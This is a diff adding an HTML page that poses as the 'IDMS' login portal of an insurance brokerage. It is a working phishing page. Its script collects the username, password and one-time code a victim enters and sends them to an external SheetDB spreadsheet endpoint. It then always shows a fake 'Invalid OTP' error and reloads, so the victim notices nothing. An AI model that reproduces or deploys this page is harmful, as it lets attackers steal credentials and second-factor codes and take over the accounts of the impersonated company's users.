@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IDMS Login | Secure</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <header>
+            <h1>IDMS</h1>
+            <p class="company-name">Assetline Insurance Brokers (Pvt) Ltd.</p>
+        </header>
+
+        <main class="login-card">
+            <form id="sheetdb-form">
+                
+                <div id="step-1">
+                    <div class="input-group">
+                        <i class="fa-solid fa-user"></i>
+                        <input type="text" id="username" name="username" placeholder="Username" required>
+                    </div>
+                    <div class="input-group">
+                        <i class="fa-solid fa-key"></i>
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                    </div>
+                    <button type="button" class="login-button" onclick="goToStep2()">
+                        <span>Login In</span>
+                        <i class="fa-solid fa-right-to-bracket"></i>
+                    </button>
+                </div>
+
+                <div id="step-2" style="display: none;">
+                    <div class="input-group">
+                        <i class="fa-solid fa-shield-halved"></i>
+                        <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
+                    </div>
+                    <input type="hidden" name="timestamp" id="timestamp">
+
+                    <button type="submit" class="login-button" id="submit-btn">
+                        <span>Verify & Login</span>
+                        <i class="fa-solid fa-check-double"></i>
+                    </button>
+                </div>
+
+            </form>
+
+            <div class="options">
+                <a href="#">Forgot your password?</a>
+            </div>
+        </main>
+
+        <footer>
+            <p>© 2024 IDMS Version 8.0.0</p>
+            <p>Designed & Developed by DP INFOTECH.</p>
+        </footer>
+    </div>
+
+    <script>
+        // 1. Navigation Logic
+        function goToStep2() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if (user && pass) {
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+            } else {
+                alert("Please enter Username and Password.");
+            }
+        }
+
+        // 2. Handle Form Submission
+        const form = document.getElementById('sheetdb-form');
+        
+        form.addEventListener("submit", e => {
+            e.preventDefault();
+
+            // Set current time
+            document.getElementById('timestamp').value = new Date().toLocaleString();
+            
+            const submitBtn = document.getElementById('submit-btn');
+            const originalBtnHtml = submitBtn.innerHTML;
+            
+            submitBtn.innerHTML = "Processing...";
+            submitBtn.disabled = true;
+
+            // Create the data object for SheetDB
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            // Send to SheetDB API
+            fetch('https://sheetdb.io/api/v1/3lr5hvus4x4j5', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ data: [data] }), 
+            })
+            .then(response => response.json())
+            .then((result) => {
+                console.log('Success:', result);
+                alert('Invalid OTP. Please try again');
+                window.location.reload(); 
+            })
+            .catch(error => {
+                alert('Connection error. Please check your internet.');
+                console.error(error);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalBtnHtml;
+            });
+        });
+    </script>
+</body>
+</html>
